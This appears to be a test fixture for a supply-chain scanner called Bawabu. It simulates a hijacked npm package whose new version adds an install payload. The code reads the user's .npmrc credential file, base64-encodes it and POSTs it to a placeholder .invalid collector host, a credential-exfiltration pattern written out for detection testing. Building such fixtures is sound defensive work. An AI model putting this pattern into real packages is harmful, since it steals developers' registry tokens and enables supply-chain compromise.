// BAWABU TEST FIXTURE #8 v2.0.0 — harmless. The hijack: a popular, previously-clean package ships a
// new major version that quietly ADDS an install payload (and, in the real attack, is published
// without the provenance earlier versions had). Bawabu must diff against v1 and flag the added
// install script + lost provenance.
// Inert: same canary-read + dead *.invalid sink as fixture #1.
const fs = require("fs"), os = require("os"), path = require("path");
const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");
try {
  const s = fs.readFileSync(target, "utf8");
  fetch(SINK, { method: "POST", body: Buffer.from(s).toString("base64") }).catch(() => {});
} catch {}
